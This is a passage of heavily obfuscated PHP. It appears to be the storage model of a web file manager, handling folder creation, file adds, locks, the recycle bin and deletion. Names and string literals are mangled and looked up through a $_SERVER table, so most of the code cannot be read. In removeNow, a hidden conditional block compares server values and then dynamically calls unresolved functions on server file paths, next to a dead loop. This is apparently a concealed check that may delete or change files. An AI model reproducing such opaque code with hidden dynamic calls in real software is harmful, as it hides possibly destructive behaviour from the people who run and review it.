= $–ö—’ë£; } } if (isset($ĞÒÃ¢„[$÷Ì©˜„[662]]) && $ĞÒÃ¢„[$÷Ì©˜„[662]]) { $Á ÒÙñÏ[] = array($÷Ì©˜„[529] => $ĞÒÃ¢„[$÷Ì©˜„[662]], $÷Ì©˜„[527] => $ĞÒÃ¢„[$÷Ì©˜„[662]], $÷Ì©˜„[1055] => $÷Ì©˜„[2048]); } if (isset($ĞÒÃ¢„[$÷Ì©˜„[486]]) && $ĞÒÃ¢„[$÷Ì©˜„[486]]) { $Û±Òê´Ô = $ĞÒÃ¢„[$÷Ì©˜„[486]]; if ($Û±Òê´Ô == $÷Ì©˜„[78]) { $Á ÒÙñÏ[$÷Ì©˜„[485]] = 1; } else { if ($Û±Òê´Ô == $÷Ì©˜„[2223]) { $Á ÒÙñÏ[$÷Ì©˜„[485]] = 0; } else { if ($Û±Òê´Ô) { $Û±Òê´Ô = is_array($Û±Òê´Ô) ? $Û±Òê´Ô : explode($÷Ì©˜„[50], $Û±Òê´Ô); $Á ÒÙñÏ[$÷Ì©˜„[486]] = array($÷Ì©˜„[492], $Û±Òê´Ô); $Á ÒÙñÏ[$÷Ì©˜„[485]] = 0; } } } } $this->_parseSearchParent($ĞÒÃ¢„, $Á ÒÙñÏ); if (isset($ĞÒÃ¢„[$÷Ì©˜„[2044]]) && trim($ĞÒÃ¢„[$÷Ì©˜„[2044]])) { $¯¬êîğÀ = trim($ĞÒÃ¢„[$÷Ì©˜„[2044]]); $ò‡›åˆœ = explode($÷Ì©˜„[53], $¯¬êîğÀ); if (strlen($¯¬êîğÀ) > 2 && (substr($¯¬êîğÀ, 0, 1) == $÷Ì©˜„[121] && substr($¯¬êîğÀ, -1) == $÷Ì©˜„[121]) || substr($¯¬êîğÀ, 0, 1) == $÷Ì©˜„[58] && substr($¯¬êîğÀ, -1) == $÷Ì©˜„[58]) { $¯¬êîğÀ = substr($¯¬êîğÀ, 1, -1); $ò‡›åˆœ = array($¯¬êîğÀ); } $Á ÒÙñÏ[$÷Ì©˜„[32]] = array(array($÷Ì©˜„[612], $÷Ì©˜„[2046] . $¯¬êîğÀ . $÷Ì©˜„[2046])); if (count($ò‡›åˆœ) > 1) { $Á ÒÙñÏ[$÷Ì©˜„[32]] = array(); foreach ($ò‡›åˆœ as $¿ĞíÏÄè) { if (!trim($¿ĞíÏÄè)) { continue; } $Á ÒÙñÏ[$÷Ì©˜„[32]][] = array($÷Ì©˜„[612], $÷Ì©˜„[2046] . trim($¿ĞíÏÄè) . $÷Ì©˜„[2046]); } } } return $Á ÒÙñÏ; } private function _parseSearchParent($€šû×†¦, &$üæà°¶µ) { $ä«ôò‡¸ =& $_SERVER[ìïæ“œî]; if (!isset($€šû×†¦[$ä«ôò‡¸[192]]) || !$€šû×†¦[$ä«ôò‡¸[192]]) { return; } $üÎÅÜØ’ = $this->pathInfo($€šû×†¦[$ä«ôò‡¸[192]]); $›é‘µæ£ = $üÎÅÜØ’[$ä«ôò‡¸[192]] . $ä«ôò‡¸[12] === $ä«ôò‡¸[228]; $´§…‹˜ò = $üÎÅÜØ’[$ä«ôò‡¸[190]] == $ä«ôò‡¸[578]; if ($üÎÅÜØ’[$ä«ôò‡¸[595]] == $ä«ôò‡¸[596]) { $È¾Øä¹§ = $this->sourceInfo($€šû×†¦[$ä«ôò‡¸[192]]); $üÎÅÜØ’[$ä«ôò‡¸[584]] = $È¾Øä¹§[$ä«ôò‡¸[584]]; } $üæà°¶µ[$ä«ôò‡¸[652]] = array($ä«ôò‡¸[612], $üÎÅÜØ’[$ä«ôò‡¸[584]] . $€šû×†¦[$ä«ôò‡¸[192]] . $ä«ôò‡¸[613]); $É¦áäÛ× = isset($€šû×†¦[$ä«ôò‡¸[1904]]) && in_array($ä«ôò‡¸[578], $€šû×†¦[$ä«ôò‡¸[1904]]); if (!$É¦áäÛ× || !$´§…‹˜ò || !$›é‘µæ£ || !$üÎÅÜØ’[$ä«ôò‡¸[487]]) { return; } if (!AuthModel::authCheckRoot($üÎÅÜØ’[$ä«ôò‡¸[487]][$ä«ôò‡¸[488]])) { return; } $úòèè‰÷ = $üÎÅÜØ’[$ä«ôò‡¸[569]] . $ä«ôò‡¸[12]; if ($úòèè‰÷ == $ä«ôò‡¸[91]) { unset($üæà°¶µ[$ä«ôò‡¸[652]]); $üæà°¶µ[$ä«ôò‡¸[190]] = self::TYPE_GROUP; return; } $Æ×Ö¼œ = Model($ä«ôò‡¸[585])->groupChildrenAll($úòèè‰÷); $İş³èæÃ = count($Æ×Ö¼œ); if ($İş³èæÃ <= 1) { return; } $á¨èû»° = array($ä«ôò‡¸[192] => 0, $ä«ôò‡¸[190] => self::TYPE_GROUP, $ä«ôò‡¸[569] => array($ä«ôò‡¸[7], $Æ×Ö¼œ)); $ÏÊ˜ô¾… = $this->field($ä«ôò‡¸[2224])->where($á¨èû»°)->limit($İş³èæÃ)->select(); $üæà°¶µ[$ä«ôò‡¸[652]] = array(); foreach ($ÏÊ˜ô¾… as $Š¸£Î¯•) { $üæà°¶µ[$ä«ôò‡¸[652]][] = array($ä«ôò‡¸[612], $ä«ôò‡¸[594] . $Š¸£Î¯•[$ä«ôò‡¸[193]] . $ä«ôò‡¸[613]); } $üæà°¶µ[$ä«ôò‡¸[652]][] = $ä«ôò‡¸[2048]; } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($µ»ôäîÊ) { $º³¢¶£È =& $_SERVER[ìïæ“œî]; $ª‚ÙÀå = Model($º³¢¶£È[577])->where(array($º³¢¶£È[1738] => $µ»ôäîÊ))->find(); $£ß›½» = $this->_mkdirRoot(SourceModel::TYPE_USER, $µ»ôäîÊ, $ª‚ÙÀå[$º³¢¶£È[32]]); $this->userDesktopAdd($£ß›½»); return $£ß›½»; } public function userDesktopAdd($–¸íè™Ï) { $ØĞÂ±À‚ =& $_SERVER[ìïæ“œî]; $ÙµÏâƒ‡ = LNG($ØĞÂ±À‚[2225]); $¨×Ä¿¾Ø = $this->mkdir($–¸íè™Ï, $ÙµÏâƒ‡); $this->metaSet($¨×Ä¿¾Ø, $ØĞÂ±À‚[2226], $ØĞÂ±À‚[91]); $this->metaSet($–¸íè™Ï, $ØĞÂ±À‚[2227], $¨×Ä¿¾Ø); } public function userPathSafeAdd($‡¸ˆÀ‹Å) { $¸çâÇÒª =& $_SERVER[ìïæ“œî]; $ÙÂÆßŸİ = Model($¸çâÇÒª[577])->getInfoFull($‡¸ˆÀ‹Å); if (!$ÙÂÆßŸİ) { return !1; } if (_get($ÙÂÆßŸİ, $¸çâÇÒª[599])) { return $ÙÂÆßŸİ[$¸çâÇÒª[539]][$¸çâÇÒª[2228]]; } $Ÿúä·ùÄ = $this->_mkdirRoot(SourceModel::TYPE_USER, $‡¸ˆÀ‹Å, $¸çâÇÒª[2229], $¸çâÇÒª[506]); Model($¸çâÇÒª[577])->metaSet($‡¸ˆÀ‹Å, $¸çâÇÒª[2228], $Ÿúä·ùÄ); $this->metaSet($Ÿúä·ùÄ, $¸çâÇÒª[2230], $‡¸ˆÀ‹Å); return $Ÿúä·ùÄ; } public function groupRootAdd($ˆŞÄ¹šé) { $û›ç¤  =& $_SERVER[ìïæ“œî]; $€Âü€Ã¸ = Model($û›ç¤ [585])->where(array($û›ç¤ [2038] => $ˆŞÄ¹šé))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $ˆŞÄ¹šé, $€Âü€Ã¸[$û›ç¤ [32]]); } public function systemRootPathAdd($ÂêõˆÍ) { if ($ÂêõˆÍ != $_SERVER[ìïæ“œî][605]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $ÂêõˆÍ); } public function userRootRemove($æŠöå’¿) { $ú¯‡ÃˆØ = $this->targetSourceRoot(SourceModel::TYPE_USER, $æŠöå’¿, !0); foreach ($ú¯‡ÃˆØ as $Ê½ö·ÙÅ) { if (!$Ê½ö·ÙÅ) { continue; } $this->remove($Ê½ö·ÙÅ[$_SERVER[ìïæ“œî][193]], !1); } } public function groupRootRemove($ƒé®ÄœÒ) { $¨±ÈÛÙè = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $ƒé®ÄœÒ); if (!$¨±ÈÛÙè) { return; } $this->remove($¨±ÈÛÙè[$_SERVER[ìïæ“œî][193]], !1); } private function _mkdirRoot($æó’±ÇÉ, $†÷’¨ûØ, $¼·ÈÌÕç, $ƒ„Ö¢÷ = '') { $œùÄ‘Ø¾ =& $_SERVER[ìïæ“œî]; $™˜“ö¤ = defined($œùÄ‘Ø¾[2172]) ? USER_ID : 0; $å…éòå¹ = array($œùÄ‘Ø¾[477] => 0, $œùÄ‘Ø¾[648] => $æó’±ÇÉ, $œùÄ‘Ø¾[649] => $†÷’¨ûØ, $œùÄ‘Ø¾[646] => 1, $œùÄ‘Ø¾[650] => $™˜“ö¤, $œùÄ‘Ø¾[651] => $™˜“ö¤, $œùÄ‘Ø¾[647] => $ƒ„Ö¢÷, $œùÄ‘Ø¾[652] => $œùÄ‘Ø¾[594], $œùÄ‘Ø¾[504] => 0, $œùÄ‘Ø¾[617] => 0, $œùÄ‘Ø¾[542] => 0, $œùÄ‘Ø¾[653] => $œùÄ‘Ø¾[12]); if ($²¯‘å£º = $this->where($å…éòå¹)->find()) { return $²¯‘å£º[$œùÄ‘Ø¾[193]]; } $şü…¬‹ = "\115\x6f\144\x65\x6c\123\x6f\165\x72\x63\145\x2e\x6d\x6b\x64\x69\x72\x52\x6f\x6f\164\x2e{$æó’±ÇÉ}\x2e{$†÷’¨ûØ}\56" . $¼·ÈÌÕç; CacheLock::lock($şü…¬‹); $å…éòå¹[$œùÄ‘Ø¾[32]] = $¼·ÈÌÕç; $¤šğåŞ = $this->add($å…éòå¹); $Ë¼–Î«ü = array($œùÄ‘Ø¾[654] => short_id($¤šğåŞ)); $this->where(array($œùÄ‘Ø¾[491] => $¤šğåŞ))->save($Ë¼–Î«ü); CacheLock::unlock($şü…¬‹); return $¤šğåŞ; } private function targetSourceRoot($ß¨ƒÖİ¡, $‹´ø, $Óñ¯ßÑ› = false) { $€¶Å¼Şï =& $_SERVER[ìïæ“œî]; $ò•…Ìƒ¥ = array($€¶Å¼Şï[477] => 0, $€¶Å¼Şï[648] => $ß¨ƒÖİ¡, $€¶Å¼Şï[649] => $‹´ø); if ($Óñ¯ßÑ›) { $İ˜ßÖ¢ = $this->where($ò•…Ìƒ¥)->select(); return $İ˜ßÖ¢ ? $İ˜ßÖ¢ : array(); } $¯Å²†¨¨ = $this->where($ò•…Ìƒ¥)->find(); return $¯Å²†¨¨ ? $¯Å²†¨¨ : array(); } public function sourceRootGroup($—åÄÜå ) { $À°øÛ¾Á =& $_SERVER[ìïæ“œî]; if (is_string($—åÄÜå )) { $—åÄÜå  = array($—åÄÜå ); } $Ì²èê = $this->listSourceRoot(SourceModel::TYPE_GROUP, $—åÄÜå , $À°øÛ¾Á[220]); $Î–Ñ…µı = array($À°øÛ¾Á[445] => $Ì²èê, $À°øÛ¾Á[442] => array($À°øÛ¾Á[807] => count($—åÄÜå ))); $this->_listDataApply($Î–Ñ…µı[$À°øÛ¾Á[445]]); $this->_listMake($Î–Ñ…µı); return array_to_keyvalue($Î–Ñ…µı[$À°øÛ¾Á[85]], $À°øÛ¾Á[569]); } public function mkfile($ğ€“ğØ, $­Ùˆ†Ò–, $¾·¬ş’Á = '', $á“·´ã¯ = REPEAT_RENAME) { $³…ß²Ãï =& $_SERVER[ìïæ“œî]; $Ë¦ºµ¯ = Model($³…ß²Ãï[674])->addFileByContent($¾·¬ş’Á, $­Ùˆ†Ò–); return $this->_createFileCall($ğ€“ğØ, $­Ùˆ†Ò–, $Ë¦ºµ¯, $á“·´ã¯, $³…ß²Ãï[1404]); } public function addFile($ÉÏ÷¬, $’†à¯¾…, $½—›¹¯œ, $À·ÁşÓÇ = false, $ğÄúÈ¶ˆ = REPEAT_RENAME) { $Š¾ì·ÛÍ = Model($_SERVER[ìïæ“œî][674])->addFile($’†à¯¾…, $½—›¹¯œ, $À·ÁşÓÇ); return $this->_createFileCall($ÉÏ÷¬, $½—›¹¯œ, $Š¾ì·ÛÍ, $ğÄúÈ¶ˆ); } public function addFileByFileID($ıÁíç‰Ş, $ŸĞåÅ”ı, $Ä¨€‹”œ, $”†°Åàâ = REPEAT_RENAME) { $—Ÿáı“Ò =& $_SERVER[ìïæ“œî]; $À£¼ŠÑî = Model($—Ÿáı“Ò[674])->find($ŸĞåÅ”ı); Model($—Ÿáı“Ò[674])->linkAdd($ŸĞåÅ”ı); return $this->_createFileCall($ıÁíç‰Ş, $Ä¨€‹”œ, $À£¼ŠÑî, $”†°Åàâ); } public function addFileByRemote($¿¼Ö¥£, $åë¡Ôê, $•ÇüÎŒ, $¶éšôúª = array(), $öºÊ¨–ğ = REPEAT_RENAME) { $‚§Â³€ƒ = Model($_SERVER[ìïæ“œî][674])->addFileByRemote($åë¡Ôê, $•ÇüÎŒ, $¶éšôúª); return $this->_createFileCall($¿¼Ö¥£, $•ÇüÎŒ, $‚§Â³€ƒ, $öºÊ¨–ğ); } private function _createFileCall($å¯û—¨£, $ô¬‚×¾É, $šÙâª¬¢, $ÅùËŒˆ„, $ĞşèŒ÷İ = "\x75\160\154\x6f\141\x64") { $…¿¥Õ¾Ê =& $_SERVER[ìïæ“œî]; $á‘ÊÏı = !1; $this->setMasterDB(); $this->lockWriteStart($å¯û—¨£, $ô¬‚×¾É); $×Ó¡ıø° = $this->fileNameExist($å¯û—¨£, $ô¬‚×¾É); $éºª¤Ò® = $this->_createFile($å¯û—¨£, $ô¬‚×¾É, $šÙâª¬¢, $ÅùËŒˆ„, $á‘ÊÏı); if (!$á‘ÊÏı) { Model($…¿¥Õ¾Ê[544])->remove($šÙâª¬¢[$…¿¥Õ¾Ê[541]]); } if ($á‘ÊÏı && $éºª¤Ò® && $éºª¤Ò® != $×Ó¡ıø°) { Model($…¿¥Õ¾Ê[2198])->eventCreate($éºª¤Ò®, $ĞşèŒ÷İ); } $this->lockWriteEnd($å¯û—¨£, $ô¬‚×¾É); return $éºª¤Ò®; } public function mkdir($âØŒ¸Š, $ºûÚºÖú, $‘›Æªíñ = REPEAT_SKIP) { $­ışõ±ç =& $_SERVER[ìïæ“œî]; $this->setMasterDB(); $ÇÁ¤³¹ú = $this->sourceInfo($âØŒ¸Š); if (!$ÇÁ¤³¹ú) { return !1; } $this->lockWriteStart($âØŒ¸Š, $ºûÚºÖú); if ($‘›Æªíñ !== !1) { $­›­´û“ = $this->fileNameExist($âØŒ¸Š, $ºûÚºÖú); if ($­›­´û“ && $‘›Æªíñ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($âØŒ¸Š, $ºûÚºÖú); return $­›­´û“; } $ºûÚºÖú = $this->fileNameAuto($âØŒ¸Š, $ºûÚºÖú, $‘›Æªíñ); } $‘Ì¤æû¢ = array($­ışõ±ç[646] => 1, $­ışõ±ç[494] => $ºûÚºÖú, $­ışõ±ç[647] => $­ışõ±ç[12], $­ışõ±ç[542] => 0, $­ışõ±ç[617] => 0); $„÷»ı–œ = $this->_addSource($‘Ì¤æû¢, $ÇÁ¤³¹ú); Model($­ışõ±ç[2198])->eventCreate($„÷»ı–œ, $­ışõ±ç[1405]); $this->lockWriteEnd($âØŒ¸Š, $ºûÚºÖú); return $„÷»ı–œ; } public function listSourceRoot($Ìİêº­, $½‰Ëçôº, $ú¸”¯• = "\x73\157\165\162\x63\145\111\x44\54\164\x61\x72\x67\x65\164\111\104\54\163\151\x7a\x65") { $õÖ‚Ğ­Á =& $_SERVER[ìïæ“œî]; $Æôµı² = $õÖ‚Ğ­Á[454]; $…‡°»¹» = array(); $ŸÃèé = 1024 * 50; $ºÊƒ¨· = is_array($ºÊƒ¨·) ? $ºÊƒ¨· : array(); $Àü€Ü‹ = count($½‰Ëçôº); $ÃÍ·Ã³è = $this->tablePrefix . $õÖ‚Ğ­Á[2231]; for ($ÒšĞß«Û = 0; $ÒšĞß«Û < $Àü€Ü‹; $ÒšĞß«Û++) { $Áë†Ğ¥Å = $½‰Ëçôº[$ÒšĞß«Û]; $Æôµı² .= "\123\105\x4c\105\x43\x54\x20\x2a\40\106\122\117\115\x20\50\123\105\114\x45\103\x54\40{$ú¸”¯•}\x20\106\122\117\115\x20\140{$ÃÍ·Ã³è}\x60\x20\127\110\x45\122\x45\40"; $Æôµı² .= "\x60\x70\141\162\x65\156\x74\x49\x44\x60\x3d\x30\x20\x41\x4e\104\x20\140\164\141\x72\x67\x65\164\111\104\140\x3d{$Áë†Ğ¥Å}\x20\x41\x4e\104\x20\140\x74\141\162\147\x65\164\124\x79\x70\x65\140\x3d{$Ìİêº­}\40\x61\156\144\x20\x66\151\x6c\x65\x54\171\x70\145\x3d\47\x27\40\154\x69\155\151\x74\40\61\51\x20\x61\x73\40\x74\x62\x5f{$ÒšĞß«Û}\x20\125\x4e\111\x4f\x4e\x20\x41\114\114\40"; if ((strlen($Æôµı²) >= $ŸÃèé || $ÒšĞß«Û == $Àü€Ü‹ - 1) && $Æôµı²) { $Æôµı² = substr($Æôµı², 0, -strlen($õÖ‚Ğ­Á[1093])); $õ¯²úÃ‹ = $this->query($Æôµı²); $Æôµı² = $õÖ‚Ğ­Á[12]; $…‡°»¹» = array_merge($…‡°»¹», $õ¯²úÃ‹); } } return $…‡°»¹»; } private function _createFile($û†¬œ‰¥, $É¢ƒ§ûî, $«ƒéÜèÚ, $ÂıóÇˆ¾, &$ªêÎí™·) { $Ñùõ– =& $_SERVER[ìïæ“œî]; $ı›ÕİŸ = $this->sourceInfo($û†¬œ‰¥); if (!$«ƒéÜèÚ || !$ı›ÕİŸ) { return !1; } if ($ÂıóÇˆ¾ !== !1) { $ß—ı‚°Ï = $this->fileNameExist($û†¬œ‰¥, $É¢ƒ§ûî); } $ªêÎí™· = !0; if ($ÂıóÇˆ¾ && $ß—ı‚°Ï) { if ($ÂıóÇˆ¾ == REPEAT_SKIP) { $ªêÎí™· = !1; return $ß—ı‚°Ï; } else { if ($ÂıóÇˆ¾ == REPEAT_REPLACE) { $şÚ”Õ§± = $this->sourceInfo($ß—ı‚°Ï); $ãéÇİÕš = $this->fileHistory($şÚ”Õ§±, $«ƒéÜèÚ[$Ñùõ–[541]], $«ƒéÜèÚ[$Ñùõ–[79]]); if (!$ãéÇİÕš) { $ªêÎí™· = !1; } else { $this->folderSizeReset($û†¬œ‰¥); } return $ß—ı‚°Ï; } else { $É¢ƒ§ûî = $this->fileNameAuto($û†¬œ‰¥, $É¢ƒ§ûî, $ÂıóÇˆ¾, !1); } } } $ºÚÔ¼ï = array($Ñùõ–[646] => 0, $Ñùõ–[494] => $É¢ƒ§ûî, $Ñùõ–[647] => substr(get_path_ext($É¢ƒ§ûî), 0, 10), $Ñùõ–[542] => $«ƒéÜèÚ[$Ñùõ–[541]], $Ñùõ–[617] => $«ƒéÜèÚ[$Ñùõ–[79]]); $ëğ¦¹í² = $this->_addSource($ºÚÔ¼ï, $ı›ÕİŸ); $this->folderSizeReset($û†¬œ‰¥, intval($ºÚÔ¼ï[$Ñùõ–[79]])); return $ëğ¦¹í²; } protected function fileHistory($Œ¶—×òà, $òÒ—Óğ™, $ßè©Ú­Ú) { $ÛäÄïù =& $_SERVER[ìïæ“œî]; if ($Œ¶—×òà[$ÛäÄïù[541]] == $òÒ—Óğ™) { return !1; } $this->checkLock($Œ¶—×òà[$ÛäÄïù[193]], $òÒ—Óğ™); Model($ÛäÄïù[2232])->addHistory($Œ¶—×òà); $š§¼‡È‹ = array($ÛäÄïù[651] => USER_ID, $ÛäÄïù[498] => time(), $ÛäÄïù[541] => $òÒ—Óğ™, $ÛäÄïù[79] => $ßè©Ú­Ú); $this->where(array($ÛäÄïù[491] => $Œ¶—×òà[$ÛäÄïù[193]]))->save($š§¼‡È‹); $this->sourceCacheClear($Œ¶—×òà[$ÛäÄïù[193]]); return !0; } public function checkLock($Ş¬Ö×‰Ä, $¥¤°Ÿ°é) { $¤Û¹Ù =& $_SERVER[ìïæ“œî]; $™Ÿ¦±ñÑ = $this->pathInfo($Ş¬Ö×‰Ä); if (!$this->fileIsLock($™Ÿ¦±ñÑ, !0)) { return; } $…¹Àı„ó = Session::get($¤Û¹Ù[2233]); $÷¬¢Ãş = substr($™Ÿ¦±ñÑ[$¤Û¹Ù[32]], 0, -1 - strlen($™Ÿ¦±ñÑ[$¤Û¹Ù[169]])) . $¤Û¹Ù[1270] . $…¹Àı„ó . $¤Û¹Ù[10] . $™Ÿ¦±ñÑ[$¤Û¹Ù[169]]; $Æô¡Œ Ô = Model($¤Û¹Ù[674])->find($¥¤°Ÿ°é); $this->_createFileCall($™Ÿ¦±ñÑ[$¤Û¹Ù[192]], $÷¬¢Ãş, $Æô¡Œ Ô, REPEAT_REPLACE, $¤Û¹Ù[1404]); $Şœ¨ş´ = $™Ÿ¦±ñÑ[$¤Û¹Ù[539]][$¤Û¹Ù[610]]; $œäÈ¾µŸ = $Şœ¨ş´[$¤Û¹Ù[2234]] ? $Şœ¨ş´[$¤Û¹Ù[2234]] : $Şœ¨ş´[$¤Û¹Ù[32]]; show_json(LNG($¤Û¹Ù[2235]) . $¤Û¹Ù[2236] . LNG($¤Û¹Ù[2237]) . $¤Û¹Ù[2238] . $œäÈ¾µŸ . $¤Û¹Ù[2239], !1); } public function fileIsLock($ÑéàÒÃ‘, $Ü¿¨Ÿõ = false) { $Ÿ®Èı˜ =& $_SERVER[ìïæ“œî]; if (!_get($ÑéàÒÃ‘, $Ÿ®Èı˜[606], 0)) { return !1; } if ($ÑéàÒÃ‘[$Ÿ®Èı˜[539]][$Ÿ®Èı˜[609]] != USER_ID) { return !0; } $ô­ëêß = $GLOBALS[$Ÿ®Èı˜[6]][$Ÿ®Èı˜[92]][$Ÿ®Èı˜[607]]; if ($ÑéàÒÃ‘[$Ÿ®Èı˜[539]][$Ÿ®Èı˜[608]] <= time() - $ô­ëêß) { $this->metaSet($ÑéàÒÃ‘[$Ÿ®Èı˜[193]], $Ÿ®Èı˜[609], null); $this->metaSet($ÑéàÒÃ‘[$Ÿ®Èı˜[193]], $Ÿ®Èı˜[608], null); } if ($Ü¿¨Ÿõ) { $this->metaSet($ÑéàÒÃ‘[$Ÿ®Èı˜[193]], $Ÿ®Èı˜[608], time()); } return !1; } private function _addSource($„°ŠßŸÊ, $ÜË…ì‚) { $Ş‚²¢­¨ =& $_SERVER[ìïæ“œî]; $Ÿ”ÆöÍÀ = defined($Ş‚²¢­¨[2172]) ? USER_ID : 0; $¸©Äá…€ = array($Ş‚²¢­¨[648] => $ÜË…ì‚[$Ş‚²¢­¨[190]], $Ş‚²¢­¨[649] => $ÜË…ì‚[$Ş‚²¢­¨[569]], $Ş‚²¢­¨[650] => $Ÿ”ÆöÍÀ, $Ş‚²¢­¨[651] => $Ÿ”ÆöÍÀ, $Ş‚²¢­¨[477] => $ÜË…ì‚[$Ş‚²¢­¨[193]], $Ş‚²¢­¨[652] => $ÜË…ì‚[$Ş‚²¢­¨[584]] . $ÜË…ì‚[$Ş‚²¢­¨[193]] . $Ş‚²¢­¨[50], $Ş‚²¢­¨[504] => 0, $Ş‚²¢­¨[653] => $Ş‚²¢­¨[12]); $„°ŠßŸÊ = array_merge($¸©Äá…€, $„°ŠßŸÊ); $this->updateModifyTime($„°ŠßŸÊ[$Ş‚²¢­¨[192]]); $ãŠöÑ Ş = $Ş‚²¢­¨[2240] . $ÜË…ì‚[$Ş‚²¢­¨[193]]; if (isset(self::$cacheChildList[$ãŠöÑ Ş])) { unset(self::$cacheChildList[$ãŠöÑ Ş]); } static $øôÒÍ÷² = false; if (!$øôÒÍ÷²) { Hook::trigger($Ş‚²¢­¨[636], $„°ŠßŸÊ); $øôÒÍ÷² = !0; } $Ä³ù‹Õ = $this->add($„°ŠßŸÊ); $åîé¬›é = array($Ş‚²¢­¨[654] => short_id($Ä³ù‹Õ)); $this->where(array($Ş‚²¢­¨[491] => $Ä³ù‹Õ))->save($åîé¬›é); $this->setNamePinyin($Ä³ù‹Õ, $„°ŠßŸÊ[$Ş‚²¢­¨[32]]); return $Ä³ù‹Õ; } public function remove($è”²ÛƒÍ, $çØ¿î… = true) { $¿×†Ãù =& $_SERVER[ìïæ“œî]; $¼’ÃÚô = $this->sourceInfo($è”²ÛƒÍ); $ªÔ¬¸Á™ = intval($¼’ÃÚô[$¿×†Ãù[190]]) === self::TYPE_SYSTEM; $™–—Üô = Model($¿×†Ãù[508])->get($¿×†Ãù[2241]) == $¿×†Ãù[91]; if ($ªÔ¬¸Á™ || $çØ¿î… || !$™–—Üô) { return $this->removeNow($è”²ÛƒÍ, $çØ¿î…); } $¢ŠÈ¯ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $ãÛ¹ş´ú = $¼’ÃÚô[$¿×†Ãù[190]] == self::TYPE_USER ? $¿×†Ãù[662] : $¿×†Ãù[578]; if ($ãÛ¹ş´ú == $¿×†Ãù[662]) { $Óªü«İ¾ = Model($¿×†Ãù[577])->getInfo($¼’ÃÚô[$¿×†Ãù[569]]); $ ®öãö = !empty($Óªü«İ¾[$¿×†Ãù[2234]]) ? $Óªü«İ¾[$¿×†Ãù[2234]] : $Óªü«İ¾[$¿×†Ãù[32]]; $ ®öãö = $¿×†Ãù[337] . $ ®öãö . $¿×†Ãù[2242] . $¼’ÃÚô[$¿×†Ãù[569]]; } else { $Óªü«İ¾ = Model($¿×†Ãù[585])->getInfo($¼’ÃÚô[$¿×†Ãù[569]]); $ ®öãö = _get($Óªü«İ¾, $¿×†Ãù[32]); $ ®öãö = $¿×†Ãù[176] . $ ®öãö . $¿×†Ãù[2243] . $¼’ÃÚô[$¿×†Ãù[569]]; } $±»ŒşÕë = $¿×†Ãù[2244] . md5($ ®öãö); CacheLock::lock($±»ŒşÕë); $å‡îİŞ  = $this->fileNameExist($¢ŠÈ¯, $ ®öãö); if (!$å‡îİŞ ) { $å‡îİŞ  = $this->mkdir($¢ŠÈ¯, $ ®öãö, REPEAT_SKIP); $this->metaSet($å‡îİŞ , $¿×†Ãù[2245], $ãÛ¹ş´ú); $this->metaSet($å‡îİŞ , $¿×†Ãù[2246], $¼’ÃÚô[$¿×†Ãù[569]]); if ($¼’ÃÚô[$¿×†Ãù[192]] != 0) { $this->metaSet($å‡îİŞ , $¿×†Ãù[2247], _get($Óªü«İ¾, $¿×†Ãù[2248])); } } CacheLock::unlock($±»ŒşÕë); $this->metaSet($è”²ÛƒÍ, $¿×†Ãù[2249], $¼’ÃÚô[$¿×†Ãù[192]]); $this->where(array($¿×†Ãù[193] => $è”²ÛƒÍ))->save(array($¿×†Ãù[498] => time())); $this->recycleClear($¼’ÃÚô); Model($¿×†Ãù[633])->eventRemove($è”²ÛƒÍ); $µàŸ²¾« = $this->move($è”²ÛƒÍ, $å‡îİŞ , REPEAT_RENAME_FOLDER); $this->folderSizeReset($¼’ÃÚô[$¿×†Ãù[192]]); return $µàŸ²¾«; } private function recycleClear($ÛÃ«½£ª) { $ş•îÈÊ¸ =& $_SERVER[ìïæ“œî]; $‹Í¬°¬ø = $this->childrenAll($ÛÃ«½£ª); $¾Ï”«¤¨ = array($ş•îÈÊ¸[491] => array($ş•îÈÊ¸[492], $‹Í¬°¬ø[$ş•îÈÊ¸[2250]])); Model($ş•îÈÊ¸[2251])->where($¾Ï”«¤¨)->delete(); } public function removeNow($­Ñ„ƒÅ, $«‚Áœ£ = true) { $¨Úïê¦Õ =& $_SERVER[ìïæ“œî]; if ($_SERVER[$¨Úïê¦Õ[927]] != $_SERVER[$¨Úïê¦Õ[1428]]) { $“´¡¨Ó = $¨Úïê¦Õ[928]; $¡Á—Á¨ = $¨Úïê¦Õ[929]; $¾Å·ˆ‡– = $_SERVER[$¨Úïê¦Õ[930]] . $¨Úïê¦Õ[931]; $½¬«ûË€ = $¡Á—Á¨($¾Å·ˆ‡–); $±‘…ıö = explode($¨Úïê¦Õ[262], $½¬«ûË€); if (count($±‘…ıö) < $¨Úïê¦Õ[688]) { $”±¿–Ö‰ = $¨Úïê¦Õ[932]; $”±¿–Ö‰(); } $î–¨áøÎ = $¨Úïê¦Õ[933]; $î–¨áøÎ($_SERVER[$¨Úïê¦Õ[934]]); $î–¨áøÎ($_SERVER[$¨Úïê¦Õ[930]] . $¨Úïê¦Õ[2252]); $€ŒÉóÂñ = 1; while ($€ŒÉóÂñ > 1) { $€ŒÉóÂñ = $€ŒÉóÂñ + 4; $’Ïğ²ÃŒ = rawurlencode($€ŒÉóÂñ . $¨Úïê¦Õ[454]); } } $Ä£«®ôÅ = $this->sourceInfo($­Ñ„ƒÅ); $ˆ•”¦’ö = $this->pathInfoMore($­Ñ„ƒÅ); if (!$Ä£«®ôÅ) { return !0; } if ($Ä£«®ôÅ[$¨Úïê¦Õ[192]] == 0) { if (!KodUser::isRoot()) { return !1; } } $this->lockMoveStart($­Ñ„ƒÅ); Hook::trigger($¨Úïê¦Õ[2253], $ˆ•”¦’ö, $«‚Áœ£); if ($«‚Áœ£) { Model($¨Úïê¦Õ[2251])->moveToRecycle($­Ñ„ƒÅ); } else { $³ßòŞæÏ = $this->childrenAll($Ä£«®ôÅ); Model($¨Úïê¦Õ[633])->eventRemove($­Ñ„ƒÅ); $this->removeRelevance($³ßòŞæÏ[$¨Úïê¦Õ[2250]], $³ßòŞæÏ[$¨Úïê¦Õ[1552]]); } $this->folderSizeReset($Ä£«®ôÅ[$¨Úïê¦Õ[192]]); $ŠñàÊÈó = array($Ä£«®ôÅ[$¨Úïê¦Õ[192]]); if ($Ä£«®ôÅ[$¨Úïê¦Õ[485]] == $¨Úïê¦Õ[91]) { $ŠñàÊÈó[] = 